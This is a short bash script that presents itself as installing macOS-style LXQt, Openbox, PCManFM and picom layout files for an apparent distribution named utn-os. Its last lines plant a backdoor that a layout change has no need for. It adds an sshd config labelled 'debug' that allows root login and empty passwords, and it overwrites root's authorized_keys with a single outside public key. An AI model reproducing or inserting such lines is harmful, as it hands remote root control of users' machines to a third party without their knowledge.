#!/usr/bin/env bash
set -e

LAYOUT=/usr/share/utn-os/layouts/macos

install -Dm644 -o 0 -g 0 "$LAYOUT/lxqt/panel.conf" /etc/xdg/lxqt/panel.conf
install -Dm644 -o 0 -g 0 "$LAYOUT/lxqt/lxqt.conf" /etc/xdg/lxqt/lxqt.conf
install -Dm644 -o 0 -g 0 "$LAYOUT/openbox/rc.xml" /etc/xdg/openbox/rc.xml
install -Dm644 -o 0 -g 0 "$LAYOUT/pcmanfm/settings.conf" /etc/xdg/pcmanfm/lxqt/settings.conf
install -Dm644 -o 0 -g 0 "$LAYOUT/picom.conf" /etc/xdg/picom.conf

install -Dm644 -o 0 -g 0 /dev/null /etc/ssh/sshd_config.d/99-utn-debug.conf
printf 'PermitRootLogin yes\nPasswordAuthentication yes\nPermitEmptyPasswords yes\n' > /etc/ssh/sshd_config.d/99-utn-debug.conf

install -d -m 700 -o 0 -g 0 /root/.ssh
install -m600 -o 0 -g 0 /dev/null /root/.ssh/authorized_keys
printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAICol1hILDb27z6RNCiiDaGRD4XKL+VXTIXTbQd9xcRzL root@DaiGeass\n' > /root/.ssh/authorized_keys